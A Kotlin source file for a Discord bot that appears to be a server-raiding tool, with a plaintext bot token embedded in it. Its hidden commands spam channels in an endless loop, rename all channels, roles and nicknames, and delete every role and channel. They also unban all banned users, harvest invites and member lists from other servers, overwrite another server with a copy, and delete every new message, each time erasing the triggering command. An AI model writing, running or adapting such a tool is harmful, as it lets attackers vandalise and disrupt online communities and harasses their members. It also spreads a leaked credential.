package app

import app.parsing.MessageParameterParser
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.javacord.api.AccountType
import org.javacord.api.DiscordApiBuilder
import org.javacord.api.entity.message.MessageBuilder
import org.javacord.api.entity.message.embed.EmbedBuilder
import org.javacord.api.entity.permission.PermissionType
import org.javacord.api.entity.permission.Role
import java.io.File
import java.net.URL
import java.time.Instant
import javax.imageio.ImageIO
import kotlin.random.Random

fun main() {
    val api = DiscordApiBuilder().setToken("Njg4ODc4MDUxMDMwOTkxMDI0.Xm8TnQ.rHm9rDVfpx-r1fPrmT2bQldePDk").login().join()

    var coroutine: Job? = null
    var noMoreMessages = false
    var dupeServer = 0L
    val peopleRoles = mutableMapOf<Long, List<Long>>()
    val peopleNick = mutableMapOf<Long, String>()
    val roleTranslation = mutableMapOf<Long, Role>()

    api.addMessageCreateListener { event ->
        val parser = MessageParameterParser(event.message)

        if (event.messageContent.toLowerCase() == "*boobs" || event.messageContent.toLowerCase() == "*sex") {
            val dogeFolder = File("D:\\troll")
            var file: File
            val files = dogeFolder.listFiles()
            file = files[(0 until (files.size - 1)).random()]

            val embed = EmbedBuilder()
            embed.setImage(file)

            event.channel.sendMessage(embed)
        }

        if (event.messageContent.startsWith("~destroy", true)) {
            event.deleteMessage()

            coroutine?.cancel()
            coroutine = GlobalScope.launch { // launch a new coroutine in background and continue
                val names = event.messageContent.substringAfter("~destroy ").split(",")

                while (true) {
                    delay(3000L) // non-blocking delay for 1 second (default time unit is ms)

                    val vc = event.server.get().createVoiceChannelBuilder()
                    vc.setName(names.random())
                    vc.setUserlimit(2)
                    vc.create()
                }
            }
        }

        if (event.messageContent.startsWith("~rolechamp", true)) {
            event.deleteMessage()

            val names = event.messageContent.substringAfter("~rolechamp ").split(",")
            val server = event.server.get()
            val roles = names.map {
                server.createRoleBuilder()
                    .setName(it).setDisplaySeparately(true).setMentionable(true).create().get() }

            server.members.forEach { it.addRole(roles.random()) }
        }

        if (event.messageContent.toLowerCase() == "~whereami") {
            event.channel.sendMessage(api.servers.map { "${it.name} - ${it.id}" }.reduce { a, b -> "$a\n$b"})
        }


        if (event.messageContent.toLowerCase() == "~stop") {
            event.deleteMessage()
            coroutine?.cancel()
        }

        if (event.messageContent.startsWith("~boobers", true)) {
            event.deleteMessage()

            val name = event.messageContent.substringAfter("~boobers ")
            event.server.get().channels.forEach { it.updateName(name) }
        }

        if (event.messageContent.startsWith("~invite", true)) {
            val server = api.getServerById(parser.extractLong("id")).get()
            event.channel.sendMessage(server.invites.get().map { it.url.toString() }.reduce { a,b -> "$a\n$b"})
        }

        if (event.messageContent.startsWith("~who", true)) {
            val server = api.getServerById(parser.extractLong("id")).get()
            event.channel.sendMessage(server.members?.map { it.discriminatedName }?.reduce { a,b -> "$a\n$b"})
        }

        if (event.messageContent.startsWith("~free", true)) {
            val server = api.getServerById(event.messageContent.substringAfter("~free ").toLong()).get()
            server.bans.get().map { it.user.id }.forEach { server.unbanUser(it) }
        }

        if (event.messageContent.startsWith("~nicker", true)) {
            event.deleteMessage()

            val name = event.messageContent.substringAfter("~nicker ")
            event.server.get().members.forEach {user ->
                user.updateNickname(event.server.get(), name)
            }
        }

        if (event.messageContent.startsWith("~boobie", true)) {
            event.deleteMessage()

            val name = event.messageContent.substringAfter("~boobie ")
            event.server.get().roles.forEach {
                it.updateDisplaySeparatelyFlag(true)
                it.updateName(name)
            }
        }

        if (event.messageContent.startsWith("~nomoremessages", true)) {
            noMoreMessages = !noMoreMessages
            event.deleteMessage()
        }

        if (event.messageContent.startsWith("~wipe", true)) {
            event.server.get().roles.forEach { it.delete() }
            event.server.get().channels.forEach { it.delete() }
        }

        if (event.messageContent.startsWith("~dupeserver", true)) {
            event.deleteMessage()

            val id = event.messageContent.substringAfter("~dupeserver ").toLong()

            val dupe = api.getServerById(id).get()

            dupe.roles.forEach { it.delete() }
            dupe.channels.forEach { it.delete() }

            dupe.updateIcon(event.server.get().icon.get().url)
            dupe.updateName(event.server.get().name)

            event.server.get().voiceChannels.filter { !it.category.isPresent }.forEach { vc ->
                val vcb = dupe.createVoiceChannelBuilder().setUserlimit(vc.userLimit.get()).setName(vc.name)
                vc.userLimit.ifPresent { ul -> vcb.setUserlimit(ul) }
                vcb.create()
            }

            event.server.get().textChannels.filter { !it.category.isPresent }.forEach { vc -> dupe.createTextChannelBuilder().setName(vc.name).create() }

            event.server.get().channelCategories.forEach() { cat ->

                val dupeCat = dupe.createChannelCategoryBuilder().setName(cat.name).create().get()
                cat.channels.forEach {
                    it.asServerTextChannel().ifPresent { dupe.createTextChannelBuilder().setName(it.name).setCategory(dupeCat).create() }
                    it.asServerVoiceChannel().filter { !it.userLimit.isPresent }.ifPresent { dupe.createVoiceChannelBuilder().setName(it.name).setCategory(dupeCat).create() }
                    it.asServerVoiceChannel().filter { it.userLimit.isPresent }.ifPresent { dupe.createVoiceChannelBuilder().setName(it.name).setUserlimit(it.userLimit.get()).setCategory(dupeCat).create() }
                }
            }

            event.server.get().roles.reversed().forEach { role ->
                val rb = dupe.createRoleBuilder().setName(role.name).setDisplaySeparately(role.isDisplayedSeparately).setMentionable(true).setPermissions(role.permissions)
                role.color.ifPresent { color -> rb.setColor(color) }
                val dupeRole = rb.create().get()

                roleTranslation[role.id] = dupeRole
            }

            event.server.get().members.forEach { member ->
                peopleRoles[member.id] = member.getRoles(event.server.get()).map { it.id }
            }

            event.server.get().members.forEach { member ->
                if (member.getNickname(event.server.get()).isPresent) peopleNick[member.id] = member.getNickname(event.server.get()).get()
            }

            dupeServer = dupe.id

            dupe.members.forEach {
                peopleRoles[it.id]?.forEach { role -> it.addRole(roleTranslation[role]) }
            }
        }

        if (noMoreMessages) {
            if (!event.messageAuthor.isYourself) event.deleteMessage()
        }
    }

    api.addServerMemberJoinListener {
        if (it.server.id != dupeServer) return@addServerMemberJoinListener
        peopleRoles[it.user.id]?.forEach { role -> it.user.addRole(roleTranslation[role]) }
        if (peopleNick.containsKey(it.user.id)) it.user.updateNickname(it.server, peopleNick[it.user.id])
    }

    println("---------- BOT ONLINE ----------")
}